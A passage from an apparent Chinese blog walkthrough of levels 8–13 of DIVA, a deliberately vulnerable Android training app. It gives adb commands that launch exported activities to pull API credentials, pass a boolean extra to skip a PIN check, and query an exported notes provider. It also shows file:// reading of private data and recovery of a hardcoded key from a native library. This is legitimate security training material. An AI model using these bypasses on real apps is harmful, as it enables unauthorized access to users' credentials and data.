src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322220539037-533361955.png" alt="image-20220322220539575"></p><p>在<code>SQLInjectionActivity#search</code>，可以看到直接将输入的用户名拼接在SQL语句后面，没有做任何过滤，导致SQL注入的发生。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322221226886-308377082.png" alt="image-20220322221227874"></p><h4 id="第八关-输入校验问题-第二部分"><a href="#第八关-输入校验问题-第二部分" class="headerlink" title="第八关 输入校验问题-第二部分"></a>第八关 输入校验问题-第二部分</h4><p>产生原因：在处理转跳时存在漏洞，导致允许从http域跨向file域，实现跨域漏洞，在 File 域下，同源策略跨域访问则能够对私有目录文件进行访问</p><p>输入一段url点击可以看到访问了这个页面</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322221551589-1756382319.png" alt="image-20220322221552254"></p><p>将https&#x2F;http协议换成File协议，利用file协议读取之前存储在sd卡的账号文件&#x2F;mnt&#x2F;sdcard&#x2F;.uinfo.txt</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322221937197-860498897.png" alt="image-20220322221937870"></p><p>在<code>InputValidation2URISchemeActivity#get</code>，代码没有对输入的数据进行处理直接loadUrl</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322222225023-451516831.png" alt="image-20220322222226194"></p><h4 id="第九关-访问控制问题-第一部分"><a href="#第九关-访问控制问题-第一部分" class="headerlink" title="第九关 访问控制问题-第一部分"></a>第九关 访问控制问题-第一部分</h4><p>点击按钮</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322222520447-960683478.png" alt="image-20220322222521636"></p><p>这里我们要不使用按钮就获取到API凭据，先定位到<code>APICredsActivity</code>类名，</p><p>查看AndroidManifest.XML文件，找到了相关的activity</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322223823174-167174189.png" alt="image-20220322223824358"></p><p>通过观察代码发现，这个activity设置了intent filter，如果为一个Activity设置了IntentFilter，你就可以在应用内或者其他应用中，用特定的隐式Intent来启动这个Activity，如果没有为Activity设置IntentFilter，那么你就只能通过显示Intent来启动这个Activity。</p><p>adb启动activity组件，输入命令，即可启动APICredsActivity</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start jakhar.aseem.diva/.APICredsActivity</span><br><span class="line">或者</span><br><span class="line">adb shell am start -n jakhar.aseem.diva/.APICredsActivity -a jakhar.aseem.diva.action.VIEW_CREDS</span><br><span class="line">am start: 启动activity 管理工具</span><br><span class="line">-a：指定action</span><br><span class="line">-n：指定完整 component 名</span><br><span class="line">命令详情：https://developer.android.google.cn/studio/command-line/adb#am</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322224436365-482229719.png" alt="image-20220322224436885"></p><h4 id="第十关-访问控制问题-第二部分"><a href="#第十关-访问控制问题-第二部分" class="headerlink" title="第十关 访问控制问题-第二部分"></a>第十关 访问控制问题-第二部分</h4><p>从题目描述可以知道，通过注册后才能拥有tveeter API Credentials，所以要通过不注册来获取API Credentials</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322224826718-716123326.png" alt="image-20220322224826794"></p><p>尝试上一关的方式，跳到了一个需要输入PIN的activity，这表明程序做了相应的措施</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322224932014-1898417047.png" alt="image-20220322224932400"></p><p>查看源码<code>APICreds2Activity</code>，获取到上一个activity传来的boolean值，并当该值为false时就获取到apikey</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322225415347-1032098981.png" alt="image-20220322225416042"></p><p>查看上一个activity，即<code>AccessControl2Activity</code>，在代码如下位置发现设置的boolean值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322230827731-1688194136.png" alt="image-20220322230828762"></p><p>这个类中bool值是通过单选项来决定的，而且把值传给下个activity，这时我们可以使用–ez来传递一个boolean键值对，但是要获取到2131099686值对应的key值是什么，十进制2131099686转换为16进制0x7f060026，在AndroidKiller中搜索0x7f060026</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322231629730-1116343886.png" alt="image-20220322231629557"></p><p>得到对于的name值为chk_pin，再全局搜索name值，得到key为check_pin</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322231855197-108821087.png" alt="image-20220322231856128"></p><p>最后adb启动activity命令，成功弹出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS2 -n jakhar.aseem.diva/.APICreds2Activity --ez check_pin false</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322232124534-182093013.png" alt="image-20220322232125667"></p><h4 id="第十一关-访问控制问题-第三部分"><a href="#第十一关-访问控制问题-第三部分" class="headerlink" title="第十一关 访问控制问题-第三部分"></a>第十一关 访问控制问题-第三部分</h4><p>根据题目的描述，这是个私人笔记app，一开始需要设置密码才能使用，现在我们尝试不设置密码就开始使用</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322232512207-651302979.png" alt="image-20220322232513013"></p><p>定位到类<code>NotesProvider</code>，对应到AndroidManifest.XML文件</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322233006812-1932681545.png" alt="image-20220322233008111"></p><p>代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;provider android:authorities=&quot;jakhar.aseem.diva.provider.notesprovider&quot; android:enabled=&quot;true&quot; android:exported=&quot;true&quot; android:name=&quot;jakhar.aseem.diva.NotesProvider&quot;/&gt;</span><br></pre></td></tr></table></figure><p>这里使用了ContentProvider，android:enabled表示是否能由系统初始化，android:exported表示是否能被其他应用使用，android:authorities标识这个ContentProvider，调用者可以根据这个标识来找到它，看到2个值都为true，我们就可以使用content:&#x2F;&#x2F;访问里面的数据了，查看包含content:&#x2F;&#x2F;的字符串文件&#x2F;smali&#x2F;jakhar&#x2F;aseem&#x2F;diva&#x2F;NotesProvider.smali</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234114956-1692793041.png" alt="image-20220322234116133"></p><p>我们可以使用以下命令访问该uri</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell content query –-uri content://jakhar.aseem.diva.provider.notesprovider/notes</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234351285-255533229.png" alt="image-20220322234352521"></p><h4 id="第十二关-硬编码-第二部分"><a href="#第十二关-硬编码-第二部分" class="headerlink" title="第十二关 硬编码-第二部分"></a>第十二关 硬编码-第二部分</h4><p>随便输入</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234519154-478736019.png" alt="image-20220322234520188"></p><p>在源码<code>Hardcode2Activity#access</code>，这里使用了DivaJni类</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234635543-1098201335.png" alt="image-20220322234636623"></p><p>查看DivaJni类的代码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234838761-1732204680.png" alt="image-20220322234839930"></p><p>这里加载了divajni库，一般库文件都放在&#x2F;lib下，在目录下找到libdivajni.so文件</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322235156437-1322532202.png" alt="image-20220322235157544"></p><p>linux下可以使用strings查看二进制文件里的字符串</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322235505226-1937628888.png" alt="image-20220322235505909"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__cxa_finalize</span><br><span class="line">__cxa_atexit</span><br><span class="line">Java_jakhar_aseem_diva_DivaJni_access</span><br><span class="line">Java_jakhar_aseem_diva_DivaJni_initiateLaunchSequence</span><br><span class="line">strcpy</span><br><span class="line">JNI_OnLoad</span><br><span class="line">_edata</span><br><span class="line">__bss_start</span><br><span class="line">_end</span><br><span class="line">libstdc++.so</span><br><span class="line">libm.so</span><br><span class="line">libc.so</span><br><span class="line">libdl.so</span><br><span class="line">libdivajni.so</span><br><span class="line">&lt;$!H</span><br><span class="line">olsdfgad;lh</span><br><span class="line">.dotdot</span><br><span class="line">;*3$&quot;</span><br><span class="line">GCC: (GNU) 4.9 20140827 (prerelease)</span><br><span class="line">gold 1.11</span><br><span class="line">.shstrtab</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.hash</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.text</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.fini_array</span><br><span class="line">.init_array</span><br><span class="line">.dynamic</span><br><span class="line">.got</span><br><span class="line">.got.plt</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br><span class="line">.note.gnu.gold-version</span><br></pre></td></tr></table></figure><p>逐个尝试，得到<code>olsdfgad;lh</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322235832847-2033031412.png" alt="image-20220322235833870"></p><h4 id="第十三关-输入校验问题-第三部分"><a href="#第十三关-输入校验问题-第三部分" class="headerlink" title="第十三关 输入校验问题-第三部分"></a>第十三关 输入校验问题-第三部分</h4><p>随便试试</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322235939256-2038808093.png" alt="image-20220322235939860"></p><p>当输入长的数据时，程序崩溃了，应该是缓冲区溢出了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323000316997-96476980.png" alt="image-20220323000317916"></p><p>查看源码<code>InputValidation3Activity#push</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323000834795-1107643338.png" alt="image-20220323000835749"></p><p>查看该类的源码<a href="https://github.com/payatu/diva-android/blob/master/app/src/main/jni/divajni.c%EF%BC%8C%E4%BD%BF%E7%94%A8%E7%9A%84%E6%98%AFstrcpy%EF%BC%8C%E5%85%B8%E5%9E%8B%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%8D%E5%88%B6%E6%BA%A2%E5%87%BA">https://github.com/payatu/diva-android/blob/master/app/src/main/jni/divajni.c，使用的是strcpy，典型的字符串复制溢出</a></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323001417565-1536880141.png" alt="image-20220323001418193"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/DmonezeCfUdx5_Bzr1lFuw">https://mp.weixin.qq.com/s/DmonezeCfUdx5_Bzr1lFuw</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;DIVA简介&quot;&gt;&lt;a href=&quot;#DIVA简介&quot; class=&quot;headerlink&quot; title=&quot;DIVA简介&quot;&gt;&lt;/a&gt;DIVA简介&lt;/h3&gt;&lt;p&gt;DIVA（该死的不安全和易受攻击的应用程序）是故意设计的存在很多漏洞的Android app。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://kpa1on.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="APP" scheme="https://kpa1on.github.io/tags/APP/"/>
    
  </entry>
  
</feed>
